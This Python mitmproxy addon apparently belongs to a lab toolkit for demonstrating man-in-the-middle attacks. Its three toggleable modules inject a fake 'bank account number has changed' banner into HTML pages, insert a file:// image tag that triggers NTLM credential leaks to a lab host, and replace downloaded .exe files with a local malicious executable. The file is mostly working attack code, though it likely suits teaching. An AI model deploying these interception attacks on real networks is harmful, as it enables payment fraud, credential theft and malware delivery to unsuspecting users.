import os

import mitmproxy as mitm


class ToolkitBase:

    def __init__(self):
        self.current_lab_ip = os.environ['CURRENT_LAB_IP']


class HTML(ToolkitBase):

    def load(self, loader):
        loader.add_option(
            name='toolkit_inject_html',
            typespec=bool,
            default=False,
            help='Toolkit: Inject HTML'
        )

    def response(self, flow):
        if mitm.ctx.options.toolkit_inject_html:
            content_type = flow.response.headers.get('Content-Type', '')
            if 'text/html' in content_type:
                flow.response.replace(
                    '</body>',
                    '<div style="background-color: #fff; position: absolute; width: 400px; height: 50%; top: 50%; left: 50%; margin-left: -200px; padding: 1em; border: 2px solid #f00; color: #f00;"><h1>Warning!</h1><p>Our account number has changed, a new one:</p><p>Fake Bank <b>UK XXXX XXXXXX</b></p><button style="margin: 0 auto; display: block;" onclick="this.parentNode.parentNode.removeChild(this.parentNode);">Close</button></div></body>'
                )


class NTLM(ToolkitBase):

    def load(self, loader):
        loader.add_option(
            name='toolkit_ntlm_honeypot',
            typespec=bool,
            default=False,
            help='Toolkit: NTLM Honeypot'
        )

    def response(self, flow):
        if mitm.ctx.options.toolkit_ntlm_honeypot:
            content_type = flow.response.headers.get('Content-Type', '')
            if 'text/html' in content_type:
                flow.response.set_content(
                    flow.response.content.replace(
                        b'</body>',
                        bytes(
                            '<img src="file://' + self.current_lab_ip + '/image.jpg"/></body>',
                            encoding='utf8'
                        )
                    )
                )


class Exec(ToolkitBase):

    def load(self, loader):
        loader.add_option(
            name='toolkit_bad_exec',
            typespec=bool,
            default=False,
            help='Toolkit: Bad executable'
        )

    def request(self, flow):
        if mitm.ctx.options.toolkit_bad_exec:
            if flow.request.pretty_url.endswith('.exe'):
                with open('/tmp/malicious.exe', 'rb') as f:
                    payload = f.read()
                mitm.flow.response = mitm.http.HTTPResponse.make(
                    200,
                    payload,
                    {'Content-Type': 'application/octet-stream'},
                )


addons = [
    HTML(),
    NTLM(),
    Exec(),
]
